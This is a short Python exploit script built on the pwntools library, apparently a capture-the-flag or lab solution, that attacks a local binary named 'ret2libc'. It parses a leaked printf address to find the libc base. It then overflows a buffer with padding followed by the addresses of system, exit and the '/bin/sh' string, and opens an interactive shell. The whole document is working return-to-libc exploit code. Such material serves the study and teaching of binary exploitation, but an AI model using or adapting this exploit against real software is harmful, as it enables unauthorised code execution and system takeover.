from pwn import *

context.log_level = 'ERROR'

p = process('./ret2libc')

# this is my version of libc, update the path to yours
# or use patchelf to change it to the provided one
libc = ELF('/usr/lib32/libc.so.6')

p.recvuntil(b': ')
printf = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = printf - libc.symbols['printf']

payload = b'A' * 0x14
payload += p32(libc.symbols['system'])  # system_plt
payload += p32(libc.symbols['exit'])
payload += p32(next(libc.search(b'/bin/sh')))

p.sendline(payload)
p.interactive()
p.close()
